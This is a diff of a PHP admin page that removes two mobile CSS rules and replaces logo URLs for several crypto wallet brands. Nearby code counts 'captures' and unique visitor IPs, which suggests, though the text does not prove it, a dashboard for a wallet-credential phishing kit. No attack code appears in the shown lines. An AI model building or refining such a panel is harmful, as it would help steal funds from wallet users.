@@ -249,9 +249,7 @@ if ($isAuthed) {
         @media (max-width: 480px) {
             .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 6px; }
             .stat-card .num { font-size: 18px; }
-            .stat-card .lbl { font-size: 9px; }
             .header-left .title { font-size: 16px; }
-            .header-left img { height: 24px; width: 24px; }
         }
     </style>
 </head>
@@ -305,16 +303,16 @@ if ($isAuthed) {
         }
         $total = count($captures); $uniqueIps = array_unique($ips);
 
-        // Wallet logo map for admin display
+        // YOUR exact wallet logo URLs
         $walletLogoMap = [
             'phantom'    => 'https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff',
+            'coinbase'   => 'https://cdn.simpleicons.org/coinbase',
             'metamask'   => 'https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg',
-            'trustwallet'=> 'https://logo.svgcdn.com/token-branded/trust-wallet.svg',
-            'solflare'   => 'https://logo.svgcdn.com/token-branded/solflare.svg',
-            'coinbase'   => 'https://static-assets.coinbase.com/ui-infra/illustration/v1/pictogram/svg/light/coinbaseLogoNavigation-2.svg',
-            'backpack'   => 'https://logo.svgcdn.com/token-branded/backpack.svg',
-            'okx'        => 'https://upload.wikimedia.org/wikipedia/commons/c/c2/OKX_logo.svg',
-            'rabby'      => 'https://raw.githubusercontent.com/RabbyHub/logo/main/rabby.svg',
+            'trustwallet'=> 'https://trustwallet.com/_next/static/media/image.8354ab2c.svg',
+            'backpack'   => 'https://files.svgcdn.io/token-branded/backpack.svg',
+            'okx'        => 'https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/okx/default.svg',
+            'solflare'   => 'https://files.svgcdn.io/token-branded/solflare.svg',
+            'rabby'      => 'https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.svg',
         ];
         ?>
 
